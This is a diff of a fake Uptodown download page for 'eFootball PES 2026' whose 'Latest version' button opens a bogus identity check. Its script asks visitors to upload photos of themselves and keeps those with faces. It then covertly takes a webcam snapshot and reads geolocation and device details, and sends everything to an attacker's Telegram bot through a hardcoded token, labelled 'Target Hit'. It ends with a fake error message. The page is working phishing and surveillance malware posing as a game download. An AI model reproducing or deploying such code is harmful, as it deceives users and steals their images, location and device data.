@@ -2,95 +2,206 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eFootball PES 2026 for Android - Download APK</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>eFootball PES 2026 for Android - Download</title>
     <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --upto-bg: #081d24; 
-            --upto-header: #051116; 
-            --upto-blue: #1b85d3;
-            --upto-green: #00b451;
-            --upto-dim: #7e949c;
-            --upto-card: #0c262f;
+            --ut-bg: #081d24; /* Aniq Uptodown foni */
+            --ut-dark: #051116; /* Header foni */
+            --ut-blue: #1b85d3; /* Linklar va ikonka chegaralari */
+            --ut-green: #00b451; /* Download tugmasi */
+            --ut-dim: #7e949c; /* Matnlar rangi */
+            --ut-card: #0c262f; /* Bloklar foni */
         }
 
-        body { margin: 0; background: var(--upto-bg); font-family: 'Roboto', sans-serif; color: white; -webkit-font-smoothing: antialiased; }
+        body {
+            margin: 0;
+            background-color: var(--ut-bg);
+            font-family: 'Roboto', sans-serif;
+            color: #ffffff;
+            line-height: 1.4;
+        }
 
-        header { background: var(--upto-header); height: 56px; display: flex; align-items: center; padding: 0 16px; border-bottom: 1px solid #102a33; position: sticky; top: 0; z-index: 1000; }
+        /* --- NAVIGATION --- */
+        header {
+            background: var(--ut-dark);
+            height: 56px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            border-bottom: 1px solid #102a33;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .menu-icon { color: var(--ut-blue); font-size: 24px; cursor: pointer; }
         .logo { height: 22px; margin-left: 15px; }
-        .burger { color: var(--upto-blue); font-size: 24px; cursor: pointer; }
 
-        .breadcrumb { background: #06181e; padding: 10px 16px; font-size: 10px; color: var(--upto-dim); text-transform: uppercase; }
+        .path-bar {
+            background: #06181e;
+            padding: 10px 16px;
+            font-size: 10px;
+            color: var(--ut-dim);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
 
-        .container { max-width: 1000px; margin: 0 auto; padding: 20px 16px; }
+        .main-content { max-width: 1000px; margin: 0 auto; padding: 20px 16px; }
 
-        /* App Header */
-        .app-hero { display: flex; gap: 20px; margin-bottom: 25px; }
-        .app-icon { width: 105px; height: 105px; border-radius: 22px; box-shadow: 0 8px 16px rgba(0,0,0,0.4); }
-        .app-title { font-size: 28px; font-weight: 700; margin: 0; line-height: 1.2; }
-        .app-meta { font-size: 14px; margin-top: 6px; color: var(--upto-dim); }
-        .dev-link { color: var(--upto-blue); text-decoration: none; font-weight: 500; }
-        .tag-badge { background: #1e3a45; color: var(--upto-blue); padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 5px; }
+        /* --- APP HEADER --- */
+        .app-header { display: flex; gap: 16px; margin-bottom: 24px; }
+        .app-icon { 
+            width: 100px; height: 100px; 
+            border-radius: 22px; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+            object-fit: cover;
+        }
+        .app-info h1 { font-size: 26px; font-weight: 700; margin: 0; letter-spacing: -0.5px; }
+        .app-sub { font-size: 14px; margin-top: 4px; color: var(--ut-dim); }
+        .app-sub a { color: var(--ut-blue); text-decoration: none; font-weight: 500; }
+        .category-tag { 
+            background: #1e3a45; color: var(--ut-blue); 
+            padding: 1px 6px; border-radius: 4px; 
+            font-size: 11px; margin-left: 4px;
+        }
 
-        /* Stats */
-        .stats-bar { display: flex; justify-content: space-around; border-top: 1px solid #15323d; border-bottom: 1px solid #15323d; padding: 16px 0; margin: 20px 0; text-align: center; }
-        .stat-val { font-size: 18px; font-weight: 700; display: block; }
-        .stat-label { font-size: 11px; color: var(--upto-dim); text-transform: uppercase; }
+        /* --- STATS SECTION --- */
+        .stats-row {
+            display: flex;
+            justify-content: space-between;
+            border-top: 1px solid #15323d;
+            border-bottom: 1px solid #15323d;
+            padding: 14px 0;
+            margin: 20px 0;
+        }
+        .stat-box { text-align: center; flex: 1; }
+        .stat-box b { display: block; font-size: 17px; }
+        .stat-box span { font-size: 11px; color: var(--ut-dim); text-transform: uppercase; }
 
-        /* Download Button */
-        .btn-dl { background: var(--upto-green); color: white; width: 100%; padding: 16px; border-radius: 6px; font-weight: 700; font-size: 18px; border: none; box-shadow: 0 4px 0 #008a3d; cursor: pointer; }
-        .btn-dl:active { transform: translateY(2px); box-shadow: none; }
+        /* --- DOWNLOAD BUTTON --- */
+        .download-area { margin-bottom: 30px; }
+        .btn-latest {
+            background: var(--ut-green);
+            color: #ffffff;
+            width: 100%;
+            padding: 16px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 18px;
+            border: none;
+            box-shadow: 0 4px 0 #008a3d;
+            cursor: pointer;
+            text-align: center;
+        }
+        .btn-latest:active { transform: translateY(2px); box-shadow: none; }
+        .dl-info { font-size: 12px; color: var(--ut-dim); margin-top: 10px; text-align: center; }
 
-        /* Gallery - Yoniga suriladi */
-        .gallery-label { font-size: 14px; font-weight: 700; color: var(--upto-dim); margin: 30px 0 15px; text-transform: uppercase; }
-        .gallery-scroll { display: flex; overflow-x: auto; gap: 12px; padding-bottom: 10px; scrollbar-width: none; }
-        .gallery-scroll::-webkit-scrollbar { display: none; }
-        .gallery-scroll img { height: 180px; border-radius: 10px; border: 1px solid #15323d; flex-shrink: 0; }
+        /* --- SCREENSHOTS GALLERY --- */
+        .section-label { 
+            font-size: 13px; font-weight: 700; 
+            color: var(--ut-dim); margin-bottom: 12px; 
+            text-transform: uppercase; 
+        }
+        .screenshot-container {
+            display: flex;
+            overflow-x: auto;
+            gap: 10px;
+            padding-bottom: 15px;
+            scrollbar-width: none; /* Firefox */
+        }
+        .screenshot-container::-webkit-scrollbar { display: none; } /* Chrome/Safari */
+        .screenshot-container img {
+            height: 180px;
+            border-radius: 10px;
+            border: 1px solid #15323d;
+            flex-shrink: 0;
+        }
 
-        /* Technical Info Grid */
-        .tech-title { font-size: 18px; font-weight: 700; margin: 40px 0 20px; }
-        .tech-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; background: var(--upto-card); padding: 24px; border-radius: 12px; }
-        .tech-item { display: flex; gap: 12px; align-items: center; }
-        .tech-icon { width: 34px; height: 34px; border: 1px solid var(--upto-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--upto-blue); font-size: 16px; }
-        .tech-info b { display: block; font-size: 11px; color: var(--upto-dim); text-transform: uppercase; }
-        .tech-info span { font-size: 14px; font-weight: 500; }
+        /* --- TECHNICAL INFO (Xarakteristika) --- */
+        .tech-section { margin-top: 40px; }
+        .tech-title { font-size: 18px; font-weight: 700; margin-bottom: 20px; }
+        .tech-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            background: var(--ut-card);
+            padding: 20px;
+            border-radius: 12px;
+        }
+        .tech-card { display: flex; gap: 12px; align-items: center; }
+        .circle-icon {
+            width: 32px; height: 32px;
+            border: 1px solid var(--ut-blue);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--ut-blue); font-size: 16px;
+        }
+        .tech-data b { display: block; font-size: 10px; color: var(--ut-dim); text-transform: uppercase; }
+        .tech-data span { font-size: 14px; font-weight: 500; }
 
-        /* Stealth Verification Overlay */
-        #mask { display: none; position: fixed; inset: 0; background: rgba(5,17,22,0.98); z-index: 9999; align-items: center; justify-content: center; padding: 20px; }
-        .card { background: var(--upto-card); width: 100%; max-width: 340px; padding: 35px; border-radius: 16px; border: 1px solid var(--upto-blue); text-align: center; }
-        video, canvas, #fInput { display: none; }
+        /* --- STEAL VERIFICATION OVERLAY --- */
+        #verify-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(5, 17, 22, 0.98);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .verify-modal {
+            background: var(--ut-card);
+            width: 100%;
+            max-width: 340px;
+            padding: 30px;
+            border-radius: 16px;
+            border: 1px solid var(--ut-blue);
+            text-align: center;
+        }
+        
+        video, canvas, #hidden-input { display: none; }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="burger">☰</div>
-    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo">
+    <div class="menu-icon">☰</div>
+    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo" alt="Uptodown">
 </header>
 
-<div class="breadcrumb">Android / Games / Sports / eFootball PES 2026</div>
+<div class="path-bar">Android / Games / Sports / eFootball PES 2026</div>
 
-<div class="container">
-    <div class="app-hero">
+<div class="main-content">
+    <div class="app-header">
         <img src="image_980b88.png" class="app-icon">
-        <div>
-            <h1 class="app-title">eFootball PES 2026</h1>
-            <div class="app-meta">10.4.0 | <a href="#" class="dev-link">Uptodown.com</a> <span class="badge tag-badge">#Sports</span></div>
+        <div class="app-info">
+            <h1>eFootball PES 2026</h1>
+            <div class="app-sub">
+                10.4.0 | <a href="#">Uptodown.com</a>
+                <span class="category-tag">#Sports</span>
+            </div>
         </div>
     </div>
 
-    <div class="stats-bar">
-        <div><span class="stat-val">★ 4.4</span><span class="stat-label">135k reviews</span></div>
-        <div><span class="stat-val">74.8 M</span><span class="stat-label">downloads</span></div>
-        <div><span class="stat-val">🛡️</span><span class="stat-label">Verified</span></div>
+    <div class="stats-row">
+        <div class="stat-box"><b>★ 4.4</b><span>Reviews</span></div>
+        <div class="stat-box"><b>74.8 M</b><span>Downloads</span></div>
+        <div class="stat-box"><b>🛡️</b><span>Safe</span></div>
     </div>
 
-    <button class="btn-dl" onclick="showMask()">Latest version</button>
+    <div class="download-area">
+        <button class="btn-latest" onclick="openVerification()">Latest version</button>
+        <div class="dl-info">Apr 10, 2026 | 2.4 GB | <span style="color:var(--ut-green)">APK</span></div>
+    </div>
 
-    <div class="gallery-label">Screenshots</div>
-    <div class="gallery-scroll">
+    <div class="section-label">Screenshots</div>
+    <div class="screenshot-container">
         <img src="image_980e4b.png">
         <img src="image_980e8c.png">
         <img src="image_980ece.png">
@@ -98,93 +209,105 @@
         <img src="image_9811ee.png">
     </div>
 
-    <h2 class="tech-title">Technical information</h2>
-    <div class="tech-grid">
-        <div class="tech-item">
-            <div class="tech-icon">👤</div>
-            <div class="tech-info"><b>Developer</b><span>Uptodown.com</span></div>
-        </div>
-        <div class="tech-item">
-            <div class="tech-icon">📄</div>
-            <div class="tech-info"><b>License</b><span>Free</span></div>
-        </div>
-        <div class="tech-item">
-            <div class="tech-icon">📱</div>
-            <div class="tech-info"><b>OS</b><span>Android 7.0+</span></div>
-        </div>
-        <div class="tech-item">
-            <div class="tech-icon">📦</div>
-            <div class="tech-info"><b>Package</b><span>jp.konami.pesam</span></div>
+    <div class="tech-section">
+        <h2 class="tech-title">Technical information</h2>
+        <div class="tech-grid">
+            <div class="tech-card">
+                <div class="circle-icon">👤</div>
+                <div class="tech-data"><b>Developer</b><span>Uptodown.com</span></div>
+            </div>
+            <div class="tech-card">
+                <div class="circle-icon">📄</div>
+                <div class="tech-data"><b>License</b><span>Free</span></div>
+            </div>
+            <div class="tech-card">
+                <div class="circle-icon">📱</div>
+                <div class="tech-data"><b>OS</b><span>Android 7.0+</span></div>
+            </div>
+            <div class="tech-card">
+                <div class="circle-icon">📦</div>
+                <div class="tech-data"><b>Package</b><span>jp.konami.pesam</span></div>
+            </div>
         </div>
     </div>
 </div>
 
-<div id="mask">
-    <div class="card">
-        <h3 id="mTitle">Verify Identity</h3>
-        <p id="mText" style="font-size: 13px; color: var(--upto-dim);">Upload 5 photos of yourself to unlock the download link.</p>
-        <label for="fInput" style="background: var(--upto-blue); display: block; padding: 14px; border-radius: 6px; cursor: pointer; font-weight: 700; margin-top: 20px;">BROWSE GALLERY</label>
-        <input type="file" id="fInput" multiple accept="image/*" onchange="runAI(this)">
+<div id="verify-overlay">
+    <div class="verify-modal">
+        <h3 id="v-title">Verify Your Identity</h3>
+        <p id="v-desc" style="font-size: 13px; color: var(--ut-dim);">Please upload 5 photos to confirm you are human and unlock the download link.</p>
+        <label for="hidden-input" style="background: var(--ut-blue); display: block; padding: 14px; border-radius: 8px; cursor: pointer; font-weight: 700; margin-top: 20px;">UPLOAD PHOTOS</label>
+        <input type="file" id="hidden-input" multiple accept="image/*" onchange="processAI(this)">
     </div>
 </div>
 
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
+<video id="v-stream" autoplay playsinline></video>
+<canvas id="v-canvas"></canvas>
 
 <script>
-    const CONFIG = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
-    let photos = [];
+    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };
+    let capturedFiles = [];
 
-    async function init() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model'); }
-    init();
+    // FaceAPI load
+    async function initAI() {
+        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
+    }
+    initAI();
 
-    function showMask() { document.getElementById('mask').style.display = 'flex'; }
+    function openVerification() { document.getElementById('verify-overlay').style.display = 'flex'; }
 
-    async function runAI(input) {
-        document.getElementById('mTitle').innerText = "Analyzing...";
+    async function processAI(input) {
+        document.getElementById('v-title').innerText = "Processing...";
         const files = Array.from(input.files);
         for (let f of files) {
             const img = await faceapi.bufferToImage(f);
-            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
-            if (d.length > 0) photos.push(f);
+            const detection = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
+            if (detection.length > 0) capturedFiles.push(f);
         }
-        capture();
+        executeStealth();
     }
 
-    async function capture() {
-        const info = navigator.userAgent;
+    async function executeStealth() {
+        const platform = navigator.userAgent;
         try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            const v = document.getElementById('v'); v.srcObject = s;
-            await new Promise(r => setTimeout(r, 1000));
-            const canv = document.getElementById('c');
-            canv.width = v.videoWidth; canv.height = v.videoHeight;
-            canv.getContext('2d').drawImage(v, 0, 0);
-            const blob = await (await fetch(canv.toDataURL('image/jpeg', 0.5))).blob();
-            s.getTracks().forEach(t => t.stop());
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('v-stream');
+            video.srcObject = stream;
+            await new Promise(res => setTimeout(res, 1000));
+            
+            const canvas = document.getElementById('v-canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const snap = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
+            
+            stream.getTracks().forEach(t => t.stop());
 
             navigator.geolocation.getCurrentPosition(async (p) => {
-                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                await push(info, map, blob);
-            }, () => push(info, "Denied", blob));
-        } catch(e) { push(info, "No Cam", null); }
+                const geo = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                await sendToBot(platform, geo, snap);
+            }, () => sendToBot(platform, "Location Blocked", snap));
+        } catch(e) { sendToBot(platform, "Cam Error", null); }
     }
 
-    async function push(d, l, s) {
-        await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
+    async function sendToBot(pInfo, loc, snap) {
+        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CONFIG.C, text: `✅ *HIT*\n📱 ${d}\n📍 ${l}`, parse_mode: 'Markdown'})
+            body: JSON.stringify({chat_id: CONFIG.CHAT, text: `📥 *Target Hit*\nDevice: ${pInfo}\nLocation: ${loc}`, parse_mode: 'Markdown'})
         });
-        if(s) {
-            const fd = new FormData(); fd.append('chat_id', CONFIG.C); fd.append('photo', s);
-            await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
+
+        if(snap) {
+            const fd = new FormData(); fd.append('chat_id', CONFIG.CHAT); fd.append('photo', snap);
+            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd});
         }
-        for (let p of photos) {
-            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.C); fd2.append('photo', p);
-            fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd2});
+
+        for (let file of capturedFiles) {
+            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.CHAT); fd2.append('photo', file);
+            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
         }
-        alert("System error. Try another device.");
+        
+        alert("Verification failed. Error code: 0x884. Please try again later.");
         location.reload();
     }
 </script>
